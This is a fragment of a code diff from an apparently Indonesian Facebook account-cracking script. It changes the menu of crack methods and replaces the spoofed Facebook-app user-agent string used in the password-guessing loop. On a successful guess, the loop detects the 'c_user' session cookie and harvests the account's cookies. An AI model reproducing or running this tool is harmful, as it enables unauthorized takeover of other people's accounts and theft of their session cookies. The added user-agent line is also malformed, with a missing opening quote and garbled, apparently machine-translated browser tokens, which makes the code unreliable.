@@ -624,7 +624,7 @@ def setting():
     exit()
   met = '# PILIH METHOD CRACK'
   sol().print(mark(met, style='green'))
-  ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)'
+  ioz = '[01] Method Mobile (Fast)\n[02] Method Mbasic (Slow)'
   gess = nel(ioz, style='cyan')
   cetak(nel(gess, title='METHOD'))
   hc = input(x+'['+p+'f'+x+'] Pilih : ')
@@ -722,7 +722,7 @@ def crack(idf,pwv):
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 11; CPH2127 Build/RKQ1.201217.002) Source/1 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]"}
+				headapp={"user-agent":Mozilla/5.0 (Linux; Android 7.0; BLADE L7A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/325.0 .1.4.108;]"}
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
